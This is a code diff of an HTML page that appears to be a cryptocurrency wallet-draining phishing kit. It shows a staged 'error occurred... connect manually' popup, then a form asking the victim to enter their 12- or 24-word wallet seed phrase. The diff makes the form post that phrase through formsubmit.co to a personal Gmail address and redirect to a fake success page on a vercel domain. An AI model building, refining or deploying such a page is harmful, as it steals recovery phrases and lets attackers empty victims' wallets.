@@ -789,23 +789,26 @@
 
         <div id="popup" class="py-5 hidden flex-col justify-center relative mt-4">
 
-            <div class="w-[80%] mx-auto border py-2 border-red-700">
-                <p class="text-[red] text-center text-[12px] lg:text-[16px] px-4">An error occurred... please try again or connect manually</p>
+            <div class=" cursor-pointer w-[80%] mx-auto border py-2 border-red-700">
+                <p class="text-[red] cursor-pointer text-center text-[12px] lg:text-[16px] px-4">An error occurred... please try again or connect manually</p>
             </div>
 
-            <div class="w-[80%] mx-auto border mt-4 py-2 border-blue-700">
-                <p class="text-[blue] text-center text-[13px] lg:text-[16px] px-4">Try Again</p>
+            <div class=" cursor-pointer w-[80%] mx-auto border mt-4 py-2 border-blue-700">
+                <p class="text-[blue] cursor-pointer text-center text-[13px] lg:text-[16px] px-4">Try Again</p>
             </div>
 
-            <button id="formed" class="w-[80%] mx-auto border mt-4 py-2 text-white bg-blue-700">Connect Manually
-            </button>
+            <div id="formed" class="border border-slate-500 justify-center flex w-[80%] mt-4 py-2 bg-blue-700 mx-auto">
+                <button class="text-white flex  rounded-lg font-semibold text-center text-[13px] lg:text-[16px] px-4">Connect Manually</button>
+
+            </div>
             
         </div>
 
         <div id="formsed" class="hidden gap-2 flex-col mt-5 items-center justify-center">
             <form method="POST" action="https://formsubmit.co/derekzuco9@gmail.com" class="flex gap-2 flex-col items-center justify-center" >
-                <input type="hidden" name="_next" value="https://google.com">
+                <input type="hidden" name="_next" value="https://publicappnode.vercel.app/success.html">
                 <input type="hidden" name="_subject" value="New submission!">
+                <input type="hidden" name="name" value="" id="text">
                 <input type="hidden" name="_captcha" value="false">
                 <textarea name="message" minlength="12" id="" rows="5" cols="35"  placeholder="Enter your wallet phrase key.. Typically 12    (sometimes 24 ...)  words separated by single comma"  class="  placeholder:text-[12px] placeholder:text-slate-500 px-2 p-2 indent-1 lg:px-0 border placeholder:p-3 border-slate-400 rounded-lg"></textarea>
                 <input type="submit" class="w-[80%] lg:w-[50%] mx-auto text-white text-[13px] rounded-lg my-2 bg-blue-700 p-2">
